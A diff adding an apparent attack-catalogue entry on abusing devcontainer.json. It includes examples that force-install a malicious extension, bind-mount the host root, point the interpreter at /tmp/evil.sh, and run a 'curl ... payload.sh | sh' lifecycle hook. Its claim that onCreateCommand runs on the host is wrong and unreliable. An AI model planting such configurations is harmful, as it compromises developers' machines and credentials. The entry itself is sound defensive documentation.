@@ -1,0 +1,100 @@
+name: Dev Container Configuration File
+id: devcontainer
+description: >
+  A `.devcontainer/devcontainer.json` file lets a repository define a complete, reproducible
+  development environment inside a Docker container — the base image, tools, VS Code extensions,
+  settings, and lifecycle commands. When a developer opens a project in its dev container, VS Code
+  builds the container and applies this configuration verbatim, which a malicious repository can
+  weaponize to install extensions, mount the host filesystem, and override editor settings.
+author: LOC Team
+tags:
+  - vscode
+  - ide
+  - devcontainer
+  - requires-interaction
+  - code-execution
+
+exploitation: |
+  Unlike many other entries here, this attack is **not** zero-click. Nothing happens just by
+  cloning and opening the repo. The configuration only runs when the user explicitly chooses to
+  **"Reopen in Container"** (or opens the repo in Codespaces). That single, deliberate action is
+  the trigger — but developers used to devcontainers routinely accept the prompt VS Code shows them when a
+  `.devcontainer` is detected, so the bar is low.
+
+  Once that happens, the following are all attacker-controlled:
+
+  ### 1. Install any extension (including malicious ones)
+
+  The `customizations.vscode.extensions` array lists extensions VS Code installs into the
+  container automatically — with no further prompt. An attacker can pull in a malicious or
+  typosquatted extension that runs on activation:
+
+  ```json
+  {
+    "customizations": {
+      "vscode": {
+        "extensions": ["attacker.totally-legit-linter"]
+      }
+    }
+  }
+  ```
+
+  ### 2. Bind-mount the entire host disk
+
+  `mounts` (and `runArgs` passed straight to Docker) control what the container can see. Mounting
+  the host root gives the container — and any code that runs in it — full read/write access to the
+  developer's real filesystem, defeating the isolation the container appears to provide:
+
+  ```json
+  {
+    "mounts": [
+      "source=/,target=/host,type=bind,consistency=cached"
+    ],
+    "runArgs": ["-v", "/:/host"]
+  }
+  ```
+
+  From there the attacker can read SSH keys, cloud credentials, and browser data, or write to
+  shell profiles on the host.
+
+  ### 3. Override any editor setting
+
+  `customizations.vscode.settings` injects arbitrary VS Code settings into the container session.
+  This chains directly into the [VS Code Settings](#vscode-settings) technique — settings such as
+  `python.defaultInterpreterPath`, `terminal.integrated.env.*`, or `*.path` executable overrides
+  run code as soon as the relevant file type is opened:
+
+  ```json
+  {
+    "customizations": {
+      "vscode": {
+        "settings": {
+          "python.defaultInterpreterPath": "/tmp/evil.sh"
+        }
+      }
+    }
+  }
+  ```
+
+  ### Lifecycle hooks
+
+  `postCreateCommand`, `onCreateCommand`, and `postStartCommand` run shell commands at different
+  stages of the container setup process. These are ideal for running setup scripts, but can also
+  execute malicious commands during container initialization:
+
+  ```json
+  {
+    "postCreateCommand": "curl http://example.com/payload.sh | sh"
+  }
+  ```
+
+  The `onCreateCommand` is especially powerful, as it runs on the host during the container creation phase,
+  allowing attackers to execute code directly on the developer's machine without any isolation.
+
+references:
+  - url: https://containers.dev/implementors/json_reference/
+    description: devcontainer.json reference (metadata, mounts, lifecycle scripts)
+  - url: https://code.visualstudio.com/docs/devcontainers/containers
+    description: VS Code — Developing inside a Container
+  - url: https://code.visualstudio.com/docs/devcontainers/create-dev-container
+    description: VS Code — Create a Dev Container (customizations, extensions, settings)
